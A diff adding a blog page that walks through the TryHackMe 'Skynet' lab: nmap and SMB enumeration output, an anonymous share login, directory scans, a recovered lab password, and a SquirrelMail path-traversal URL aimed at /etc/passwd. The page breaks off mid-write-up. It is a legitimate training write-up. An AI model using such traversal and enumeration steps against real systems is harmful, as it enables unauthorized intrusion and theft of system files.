@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thm-Skynet - 安全员小周 | ROOT</title>
+    <!-- Prism CSS for Synthax Highlighting (White Theme) -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="article-mode">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="brand">
+            <span>#_</span> 安全员小周
+        </div>
+
+        <div class="nav-group">
+        <div class="nav-header">知识库</div>
+            <details class="folder-group">
+                <summary>鹏城杯2024</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-19-鹏城杯2024-训练.html" class="nav-item">鹏城杯2024-训练</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>计算机网络</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-06-21-计算机网络-OSPF.html" class="nav-item">计算机网络-OSPF</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>综合归档</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-30-CISCN-2018Picture-misc-wp.html" class="nav-item">CISCN_2018Picture_misc_wp</a>
+            
+                <a href="/posts/2024-03-13-Rick-pickle.html" class="nav-item">Rick_pickle</a>
+            
+                <a href="/posts/2024-03-19-Blue靶场实践.html" class="nav-item">Blue靶场实践</a>
+            
+                <a href="/posts/2024-04-26-github-PicGo-obsidian.html" class="nav-item">github+PicGo+obsidian</a>
+            
+                <a href="/posts/2024-05-25-刷题记录.html" class="nav-item">刷题记录</a>
+            
+                <a href="/posts/2024-06-07-计算机组成原理-运算器.html" class="nav-item">计算机组成原理_运算器</a>
+            
+                <a href="/posts/2024-06-21-计算机组成原理-存储器.html" class="nav-item">计算机组成原理_存储器</a>
+            
+                <a href="/posts/2024-07-21-redis-利用方式大全.html" class="nav-item">redis_利用方式大全</a>
+            
+                <a href="/posts/2024-07-27-hackmyvm-coffeeshop.html" class="nav-item">hackmyvm_coffeeshop</a>
+            
+                <a href="/posts/2024-08-17-log4shell.html" class="nav-item">log4shell</a>
+            
+                <a href="/posts/2024-09-09-浏览器解码顺序和解析顺序for-xss.html" class="nav-item">浏览器解码顺序和解析顺序for-xss</a>
+            
+                <a href="/posts/2024-09-16-CORS-跨域资源共享.html" class="nav-item">CORS_跨域资源共享</a>
+            
+                <a href="/posts/2024-09-17-ip2domain.html" class="nav-item">ip2domain</a>
+            
+                <a href="/posts/2024-09-17-Oneforall.html" class="nav-item">Oneforall</a>
+            
+                <a href="/posts/2024-09-17-类.html" class="nav-item">类</a>
+            
+                <a href="/posts/2024-10-20-activity.html" class="nav-item">activity</a>
+            
+                <a href="/posts/2024-10-20-manifest.html" class="nav-item">manifest</a>
+            
+                <a href="/posts/2024-10-20-service.html" class="nav-item">service</a>
+            
+                <a href="/posts/2024-10-30-2024网鼎杯青龙组.html" class="nav-item">2024网鼎杯青龙组</a>
+            
+                <a href="/posts/2024-10-30-网鼎杯模拟赛.html" class="nav-item">网鼎杯模拟赛</a>
+            
+                <a href="/posts/2024-11-04-子域名泛解析解析.html" class="nav-item">子域名泛解析解析</a>
+            
+                <a href="/posts/2024-11-05-dns欺骗.html" class="nav-item">dns欺骗</a>
+            
+                <a href="/posts/2024-11-05-mac-泛洪.html" class="nav-item">mac_泛洪</a>
+            
+                <a href="/posts/2024-11-15-服务.html" class="nav-item">服务</a>
+            
+                <a href="/posts/2024-11-17-app大致框架.html" class="nav-item">app大致框架</a>
+            
+                <a href="/posts/2024-11-25-安全狗.html" class="nav-item">安全狗</a>
+            
+                <a href="/posts/2024-11-30-hash扩展攻击.html" class="nav-item">hash扩展攻击</a>
+            
+                <a href="/posts/2024-11-30-RCE绕过.html" class="nav-item">RCE绕过</a>
+            
+                <a href="/posts/2024-11-30-tcp握手.html" class="nav-item">tcp握手</a>
+            
+                <a href="/posts/2024-11-30-WEBDAv.html" class="nav-item">WEBDAv</a>
+            
+                <a href="/posts/2024-11-30-短文件名枚举.html" class="nav-item">短文件名枚举</a>
+            
+                <a href="/posts/2024-12-19-ciscn训练.html" class="nav-item">ciscn训练</a>
+            
+                <a href="/posts/2024-12-25-新星赛.html" class="nav-item">新星赛</a>
+            
+                <a href="/posts/2025-01-07-软件安全赛.html" class="nav-item">软件安全赛</a>
+            
+                <a href="/posts/2025-01-15-jsonp.html" class="nav-item">jsonp</a>
+            
+                <a href="/posts/2025-01-15-同源策略.html" class="nav-item">同源策略</a>
+            
+                <a href="/posts/2025-01-19-一次混淆webshell分析.html" class="nav-item">一次混淆webshell分析</a>
+            
+                <a href="/posts/2025-01-23-hexo博客搭建.html" class="nav-item">hexo博客搭建</a>
+            
+                <a href="/posts/2025-01-29-SMB445端口利用.html" class="nav-item">SMB445端口利用</a>
+            
+                <a href="/posts/2025-01-30-域常见信息枚举.html" class="nav-item">域常见信息枚举</a>
+            
+                <a href="/posts/2025-02-03-红日1.html" class="nav-item">红日1</a>
+            
+                <a href="/posts/2025-02-05-URLDNS链.html" class="nav-item">URLDNS链</a>
+            
+                <a href="/posts/2025-02-14-安全服务实习面经.html" class="nav-item">安全服务实习面经</a>
+            
+                <a href="/posts/2025-02-21-实习该反问什么-.html" class="nav-item">实习该反问什么?</a>
+            
+                <a href="/posts/2025-04-05-c--内存机制和安全.html" class="nav-item">c++内存机制和安全</a>
+            
+                <a href="/posts/2025-06-01-pickle.html" class="nav-item">pickle</a>
+            
+                <a href="/posts/2025-06-02-vllm大模型推理引擎.html" class="nav-item">vllm大模型推理引擎</a>
+            
+                <a href="/posts/hello-world.html" class="nav-item">我的第一篇安全文章</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>算法</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-20-算法-Init.html" class="nav-item">算法-Init</a>
+            
+                <a href="/posts/2024-09-20-算法-分治和逆序.html" class="nav-item">算法-分治和逆序</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>漏洞复现</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-11-30-常见服务器解析漏洞.html" class="nav-item">常见服务器解析漏洞</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>湖北大学</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-湖北大学-奇安信杯完整版wp.html" class="nav-item">湖北大学-奇安信杯完整版wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>横向移动</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-横向移动-远程创建进程.html" class="nav-item">横向移动-远程创建进程</a>
+            
+                <a href="/posts/2024-09-10-横向移动-WMI.html" class="nav-item">横向移动-WMI</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>权限提升</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-04-权限提升-Linux-passwd提权.html" class="nav-item">权限提升-Linux passwd提权</a>
+            
+                <a href="/posts/2024-03-09-权限提升-windows计划任务提权.html" class="nav-item">权限提升-windows计划任务提权</a>
+            
+                <a href="/posts/2024-03-19-权限提升-windows服务提权.html" class="nav-item">权限提升-windows服务提权</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>文件上传</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-18-文件上传-php.html" class="nav-item">文件上传-php</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>数学基础信安总结</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-数学基础信安总结-一次遗忘的作业.html" class="nav-item">数学基础信安总结-一次遗忘的作业</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>操作系统</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-操作系统-api接口.html" class="nav-item">操作系统-api接口</a>
+            
+                <a href="/posts/2024-09-11-操作系统-启动.html" class="nav-item">操作系统-启动</a>
+            
+                <a href="/posts/2024-09-11-操作系统-基础认识.html" class="nav-item">操作系统-基础认识</a>
+            
+                <a href="/posts/2024-10-20-操作系统-内核.html" class="nav-item">操作系统-内核</a>
+            
+                <a href="/posts/2024-10-20-操作系统-进程.html" class="nav-item">操作系统-进程</a>
+            
+                <a href="/posts/2024-11-12-操作系统启动实验.html" class="nav-item">操作系统启动实验</a>
+            
+                <a href="/posts/2024-11-12-操作系统进程管理实验.html" class="nav-item">操作系统进程管理实验</a>
+            
+                <a href="/posts/2024-12-25-操作系统概念集合.html" class="nav-item">操作系统概念集合</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>外联木马分析</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-26-外联木马分析-ciscn.html" class="nav-item">外联木马分析-ciscn</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>域整理</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-27-域整理-基础.html" class="nav-item">域整理-基础</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网穿透</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-内网穿透-ligolo使用.html" class="nav-item">内网穿透-ligolo使用</a>
+            
+                <a href="/posts/2025-01-14-内网穿透-ssh搭建.html" class="nav-item">内网穿透-ssh搭建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网安全</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-29-内网横向的一些方式.html" class="nav-item">内网横向的一些方式</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>VULNHUB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-vulnhub-vegeta.html" class="nav-item">vulnhub-vegeta</a>
+            
+                <a href="/posts/2024-07-13-Vulnhub-Aiweb1.html" class="nav-item">Vulnhub-Aiweb1</a>
+            
+                <a href="/posts/2024-07-14-Vulnhub-Breakout.html" class="nav-item">Vulnhub-Breakout</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>TRYHACKME</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-Tryhackme-Overpass.html" class="nav-item">Tryhackme-Overpass</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>THM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-Thm-alfred.html" class="nav-item">Thm-alfred</a>
+            
+                <a href="/posts/2024-05-14-Thm-Steel-Mountain.html" class="nav-item">Thm-Steel-Mountain</a>
+            
+                <a href="/posts/2024-08-17-Thm-Gane-zone.html" class="nav-item">Thm-Gane_zone</a>
+            
+                <a href="/posts/2024-08-17-Thm-Hackpark.html" class="nav-item">Thm-Hackpark</a>
+            
+                <a href="/posts/2024-08-17-Thm-Skynet.html" class="nav-item">Thm-Skynet</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQLI</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-19-sqli-labs靶场-二次注入.html" class="nav-item">sqli-labs靶场-二次注入</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQL</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-30-sql-学习-day1.html" class="nav-item">sql_学习_day1</a>
+            
+                <a href="/posts/2024-05-03-sql-索引.html" class="nav-item">sql-索引</a>
+            
+                <a href="/posts/2024-05-03-sql-表修改和创建.html" class="nav-item">sql-表修改和创建</a>
+            
+                <a href="/posts/2024-05-03-sql-表增删查改.html" class="nav-item">sql-表增删查改</a>
+            
+                <a href="/posts/2024-05-03-sql-视图创建.html" class="nav-item">sql-视图创建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SNORT</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-09-snort-ips.html" class="nav-item">snort-ips</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>PHPMYADMIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-phpmyadmin-getshell姿势.html" class="nav-item">phpmyadmin-getshell姿势</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>NSSCTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-26-nssctf-round-16web部分wp.html" class="nav-item">nssctf-round#16web部分wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>JAVA</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-java-包和输入输出.html" class="nav-item">java-包和输入输出</a>
+            
+                <a href="/posts/2024-09-11-java-数据结构.html" class="nav-item">java-数据结构</a>
+            
+                <a href="/posts/2024-09-11-java-逻辑结构.html" class="nav-item">java-逻辑结构</a>
+            
+                <a href="/posts/2025-02-05-java动态代理.html" class="nav-item">java动态代理</a>
+            
+                <a href="/posts/2025-02-05-java反射.html" class="nav-item">java反射</a>
+            
+                <a href="/posts/2025-02-05-java反序列化.html" class="nav-item">java反序列化</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HTB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-HTB-LAME.html" class="nav-item">HTB-LAME</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HACKMYVM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-15-Hackmyvm-leet.html" class="nav-item">Hackmyvm-leet</a>
+            
+                <a href="/posts/2024-10-10-Hackmyvm-Lookup.html" class="nav-item">Hackmyvm-Lookup</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>EW</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-17-ew-内网.html" class="nav-item">ew-内网</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>DOCKER</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-02-01-docker.html" class="nav-item">docker</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>CTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-03-sictf-web.html" class="nav-item">sictf_web</a>
+            
+                <a href="/posts/2024-03-19-CTF长城杯.html" class="nav-item">CTF长城杯</a>
+            
+                <a href="/posts/2024-03-30-ctf-misc-掌控腾龙杯.html" class="nav-item">ctf-misc-掌控腾龙杯</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录1.html" class="nav-item">ctf刷题记录1</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录2.html" class="nav-item">ctf刷题记录2</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录3.html" class="nav-item">ctf刷题记录3</a>
+            
+                <a href="/posts/2024-07-21-ctfhub-ssrf基础认证.html" class="nav-item">ctfhub_ssrf基础认证</a>
+            
+                <a href="/posts/2024-07-28-ctf刷题记录4.html" class="nav-item">ctf刷题记录4</a>
+            
+                <a href="/posts/2024-09-11-2024-9-11-CTF.html" class="nav-item">2024-9-11-CTF</a>
+            
+                <a href="/posts/2024-09-12-CTF-Ciscn-cyberpunk.html" class="nav-item">CTF-Ciscn-cyberpunk</a>
+            
+                <a href="/posts/2024-10-02-CTF刷题buuctf.html" class="nav-item">CTF刷题buuctf</a>
+            
+                <a href="/posts/2025-01-19-suctf.html" class="nav-item">suctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>BEGIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-11-begin-ctf.html" class="nav-item">begin-ctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>ANDROID</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-16-2024-1-2-12-Android-Studio配置.html" class="nav-item">2024-1.2.12-Android-Studio配置</a>
+            
+                <a href="/posts/2024-09-19-Android-UI设计.html" class="nav-item">Android_UI设计</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>AD域枚举信息</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-AD域枚举信息-BloodHound.html" class="nav-item">AD域枚举信息-BloodHound</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-Microsoft控制台MMC.html" class="nav-item">AD域枚举信息-Microsoft控制台MMC</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-powershell-cmdlet.html" class="nav-item">AD域枚举信息-powershell-cmdlet</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-命令枚举.html" class="nav-item">AD域枚举信息-命令枚举</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>4</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-28-4-28ctf急切刷题.html" class="nav-item">4-28ctf急切刷题</a>
+            </div></details></div>
+
+        <div class="user-profile">
+            <div class="avatar" style="background:#333; border:1px solid #00ff41; color:#00ff41;">K</div>
+            <div style="font-size: 0.9rem; font-weight: 500; color: #00ff41;">安全员小周</div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-wrapper">
+        <header class="top-header">
+            <div class="breadcrumb">
+                ~/home/THM/Thm-Skynet ...
+            </div>
+
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="grep -r 'keyword' ." id="searchInput">
+                <div class="search-results" id="searchResults"></div>
+            </div>
+        </header>
+
+        <main class="content-area">
+            <h1 class="article-title">Thm-Skynet</h1>
+            <div class="markdown-body">
+                <p>机器信息</p>
+<p>Skynet</p>
+<p>系统</p>
+<p>linux</p>
+<p>信息</p>
+<p>有点意思 使用smb 匿名访问 找到相关的 用户信息之后依旧是目录扫描扫到了 一个旁站是一个邮箱系统 可以试着登陆成功进入smb系统 之后再邮件系统中找到 更改密码的 登陆可以找到 一个milesdyson的 私人目录 可以看到一个新的cms 之后就可以找到一个nday 远程文件包含 可以getshell 后使用 内核提权 拿到root权限</p>
+<h3>0X01循例信息收集</h3>
+<pre><code class="language-shell">Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-14 09:20 UTCNmap scan report for ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)Host is up (0.0054s latency).Not shown: 994 closed tcp ports (reset)PORT
+STATE SERVICE22/tcp  open  ssh80/tcp  open  http110/tcp open  pop3139/tcp open  netbios-ssn143/tcp open  imap445/tcp open  microsoft-dsMAC Address: 02:58:B4:7D:6E:6D (Unknown)# 详细扫描PORT
+STATE SERVICE
+VERSION22/tcp  open  ssh
+OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 992331bbb1e943b756944cb9e82146c5 (RSA)|   256 57c07502712d193183dbe4fe679668cf (ECDSA)|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)80/tcp  open  http
+Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Skynet110/tcp open  pop3
+Dovecot pop3d|_pop3-capabilities: TOP CAPA SASL RESP-CODES UIDL AUTH-RESP-CODE PIPELINING139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open  imap
+Dovecot imapd|_imap-capabilities: IDLE ID SASL-IR post-login ENABLE Pre-login more capabilities have LITERAL+ OK LOGIN-REFERRALS listed LOGINDISABLEDA0001 IMAP4rev1445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)MAC Address: 02:58:B4:7D:6E:6D (Unknown)Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s| smb2-security-mode: |   311: |_
+Message signing enabled but not required|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)| smb2-time: |   date: 2024-06-14T09:22:35|_  start_date: N/A| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: skynet|   NetBIOS computer name: SKYNET\x00|   Domain name: \x00|   FQDN: skynet|_  System time: 2024-06-14T04:22:35-05:00TRACEROUTEHOP RTT
+ADDRESS1   0.54 ms ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)
+</code></pre>
+<h4>0X02资产梳理</h4>
+<h3>0X10开放端口及服务</h3>
+<ol>
+<li><p><strong>22/tcp - SSH</strong></p>
+<ul>
+<li><strong>服务</strong>: OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)</li>
+<li><strong>操作系统</strong>: Ubuntu Linux</li>
+<li><strong>协议</strong>: SSH协议版本 2.0</li>
+<li><strong>SSH Hostkeys</strong>:<ul>
+<li>RSA 2048-bit key fingerprint: 992331bbb1e943b756944cb9e82146c5</li>
+<li>ECDSA 256-bit key fingerprint: 57c07502712d193183dbe4fe679668cf</li>
+<li>ED25519 256-bit key fingerprint: 46fa4efc10a54f5757d06d54f6c34dfe</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>80/tcp - HTTP</strong></p>
+<ul>
+<li><strong>服务</strong>: Apache HTTP Server 2.4.18 (Ubuntu)</li>
+<li><strong>HTTP服务器头</strong>: Apache/2.4.18 (Ubuntu)</li>
+<li><strong>HTTP标题</strong>: Skynet</li>
+</ul>
+</li>
+<li><p><strong>110/tcp - POP3</strong></p>
+<ul>
+<li><strong>服务</strong>: Dovecot pop3d</li>
+<li><strong>POP3能力</strong>: TOP, CAPA, SASL, RESP-CODES, UIDL, AUTH-RESP-CODE, PIPELINING</li>
+</ul>
+</li>
+<li><p><strong>139/tcp 和 445/tcp - NetBIOS/SMB</strong></p>
+<ul>
+<li><strong>服务</strong>: Samba smbd 4.3.11-Ubuntu</li>
+<li><strong>工作组</strong>: WORKGROUP</li>
+</ul>
+</li>
+<li><p><strong>143/tcp - IMAP</strong></p>
+<ul>
+<li><strong>服务</strong>: Dovecot imapd</li>
+<li><strong>IMAP能力</strong>: IDLE, ID, SASL-IR, post-login, ENABLE, Pre-login, LITERAL+, OK, LOGIN-REFERRALS, LOGINDISABLEDA0001, IMAP4rev1</li>
+</ul>
+</li>
+</ol>
+<h3>主机信息</h3>
+<ul>
+<li><strong>MAC地址</strong>: 02:58:B4:7D:6E:6D (未知制造商)</li>
+<li><strong>主机名</strong>: SKYNET</li>
+<li><strong>操作系统猜测</strong>:<ul>
+<li>主要为各种版本的Linux（例如3.10 - 3.13, 5.4, 3.16等）</li>
+<li>Android操作系统（5.1, 7.1.1 - 7.1.2）</li>
+</ul>
+</li>
+</ul>
+<h3>网络距离</h3>
+<ul>
+<li>目标主机与扫描主机之间的网络跳数：1 hop</li>
+</ul>
+<h3>服务信息</h3>
+<ul>
+<li><strong>时间偏移</strong>: 平均时钟偏移约为1小时40分钟</li>
+<li><strong>SMB安全模式</strong>:<ul>
+<li>消息签名已启用但不强制</li>
+</ul>
+</li>
+<li><strong>NetBIOS信息</strong>: 计算机名为SKYNET，域名为空</li>
+<li><strong>SMB时间</strong>: 当前时间为2024年6月14日09:22:35（UTC）</li>
+</ul>
+<blockquote>
+<p>**目前不能偏向究竟是何种操作系统 根据不同服务 可以看到不同的服务</p>
+</blockquote>
+<h3>0x20 smb445</h3>
+<blockquote>
+<p>先试试samba 4.3.11<br>暂时搁置 脚本扫一遍smb 协议</p>
+</blockquote>
+<p>smb 445</p>
+<p>[[smb 445#namp 脚本探测]]</p>
+<pre><code class="language-shell">Host script results:| smb-enum-shares: |   account_used: guest|   \\10.10.14.193\IPC$: |
+Type: STYPE_IPC_HIDDEN|
+Comment: IPC Service (skynet server (Samba, Ubuntu))|
+Users: 2|
+Max Users: &lt;unlimited&gt;|
+Path: C:\tmp|
+Anonymous access: READ/WRITE|
+Current user access: READ/WRITE|   \\10.10.14.193\anonymous: |
+Type: STYPE_DISKTREE|
+Comment: Skynet Anonymous Share|
+Users: 0|
+Max Users: &lt;unlimited&gt;|
+Path: C:\srv\samba|
+Anonymous access: READ/WRITE|
+Current user access: READ/WRITE|   \\10.10.14.193\milesdyson: |
+Type: STYPE_DISKTREE|
+Comment: Miles Dyson Personal Share|
+Users: 0|
+Max Users: &lt;unlimited&gt;|
+Path: C:\home\milesdyson\share|
+Anonymous access: &lt;none&gt;|
+Current user access: &lt;none&gt;|   \\10.10.14.193\print$: |
+Type: STYPE_DISKTREE|
+Comment: Printer Drivers|
+Users: 0|
+Max Users: &lt;unlimited&gt;|
+Path: C:\var\lib\samba\printers|
+Anonymous access: &lt;none&gt;|_
+Current user access: &lt;none&gt;| smb-enum-users: |   SKYNET\milesdyson (RID: 1000)|
+Full name:   |
+Description: |_
+Flags:
+Normal user account
+</code></pre>
+<blockquote>
+<p>可得信息</p>
+</blockquote>
+<ol>
+<li><p><strong>共享信息</strong>：</p>
+<ul>
+<li><strong>IPC$</strong>: 这是一个隐藏的IPC服务，允许匿名用户进行读写访问。路径为 <code>C:\tmp</code>。</li>
+<li><strong>anonymous</strong>: 这是一个匿名共享，允许匿名用户进行读写访问。路径为 <code>C:\srv\samba</code>。</li>
+<li><strong>milesdyson</strong>: 这是Miles Dyson的个人共享，但是不允许匿名用户访问。路径为 <code>C:\home\milesdyson\share</code>。</li>
+<li><strong>print$</strong>: 这是打印机驱动程序的共享，不允许匿名用户访问。路径为 <code>C:\var\lib\samba\printers</code>。</li>
+</ul>
+</li>
+<li><p><strong>用户信息</strong>：</p>
+<ul>
+<li><strong>SKYNET\milesdyson</strong>: 这是一个普通用户账户，RID为1000，没有提供全名或描述信</li>
+</ul>
+</li>
+</ol>
+<p>共享资源</p>
+<p>[[smb 445#找到特定的资源如何做?#]]</p>
+<h3>0x11 smb登陆</h3>
+<blockquote>
+<p>可以看到基本上匿名用户都有一个读写权限我们可以一一在匿名用户权限下 查看可以利用的文件</p>
+</blockquote>
+<pre><code class="language-c">smbclient //10.10.14.193/anonymous
+</code></pre>
+<p>其实这个时候我试了一下nfs感觉还是linux 的感觉多一些<br>找了一条通知消息</p>
+<pre><code class="language-text">最近系统故障导致多个密码被更改。所有Skynet员工在看到这条消息后需要更改他们的密码。- 迈尔斯·戴森
+</code></pre>
+<p>试试milesdyson用户的私有文件思路断了</p>
+<h3>0x20 web</h3>
+<h5>信息收集</h5>
+<h6>目录扫描</h6>
+<pre><code class="language-shell">---- Scanning URL: http://10.10.104.193/ ----==&gt; DIRECTORY: http://10.10.104.193/admin/
+==&gt; DIRECTORY: http://10.10.104.193/config/
+==&gt; DIRECTORY: http://10.10.104.193/css/
++ http://10.10.104.193/index.html (CODE:200|SIZE:523)
+==&gt; DIRECTORY: http://10.10.104.193/js/
++ http://10.10.104.193/server-status (CODE:403|SIZE:278)
+==&gt; DIRECTORY: http://10.10.104.193/squirrelmail/  [21:32:40] 403 -  278B  - /.ht_wsr.txt
+[21:32:40] 403 -  278B  - /.htaccess.orig
+[21:32:40] 403 -  278B  - /.htaccess.sample[21:32:40] 403 -  278B  - /.htaccess.save[21:32:40] 403 -  278B  - /.htaccess_extra
+[21:32:40] 403 -  278B  - /.htaccess_orig[21:32:40] 403 -  278B  - /.htaccessBAK[21:32:40] 403 -  278B  - /.htaccessOLD
+[21:32:40] 403 -  278B  - /.htaccessOLD2[21:32:40] 403 -  278B  - /.html
+[21:32:40] 403 -  278B  - /.htaccess_sc[21:32:40] 403 -  278B  - /.htm
+[21:32:40] 403 -  278B  - /.httr-oauth
+[21:32:40] 403 -  278B  - /.htpasswds[21:32:40] 403 -  278B  - /.htpasswd_test[21:32:41] 403 -  278B  - /.htaccess.bak1
+[21:32:44] 403 -  278B  - /.php
+[21:32:44] 403 -  278B  - /.php3
+[21:33:05] 403 -  278B  - /admin/
+[21:33:46] 403 -  278B  - /config/
+[21:34:22] 403 -  278B  - /js/
+[21:35:02] 403 -  278B  - /server-status
+[21:35:04] 403 -  278B  - /server-status/
+</code></pre>
+<blockquote>
+<p>admin被禁止 访问到一个框架 SquirrelMail version 1.4.23<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240625213714.png" alt="image.png"></p>
+</blockquote>
+<blockquote>
+<p>发现一个远程代码执行漏洞但是目前唯一的问题是 我不知道登陆用户的账号和密码<br>因此无法利用 还是要看看能不能找到<br>之前看到一个信息泄露 milesdyson 猜测可能有他的邮箱</p>
+</blockquote>
+<p>还有个文件包含 h<a href="http://10.10.12.99/squirrelmail/src/redirect.php?plugins%5B%5D=../../../../etc/passwd%00">http://10.10.12.99/squirrelmail/src/redirect.php?plugins[]=../../../../etc/passwd%00</a><br>试了没啥效果 …..</p>
+<h5>回溯smb</h5>
+<blockquote>
+<p>回溯smb协议<br>看错了 log目录没看到 里面有log1.txt 泄露了很多可以看到密码<br>直接bp爆破</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628165637.png" alt="image.png"></p>
+<p>可以看到cyborg007haloterminator 是用户的密码 milesdyson</p>
+<h4>0x22 继续信息收集</h4>
+<pre><code class="language-shell">/images
+(Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/images/]/help
+(Status: 403) [Size: 276]/themes
+(Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/themes/]/plugins
+(Status: 301) [Size: 325] [--&gt; http://10.10.66.17/squirrelmail/plugins/]/src
+(Status: 301) [Size: 321] [--&gt; http://10.10.66.17/squirrelmail/src/]/include
+(Status: 403) [Size: 276]/config
+(Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/config/]/class
+(Status: 403) [Size: 276]/functions
+(Status: 403) [Size: 276]/po
+(Status: 403) [Size: 276]/locale
+(Status: 403) [Size: 276]
+</code></pre>
+<blockquote>
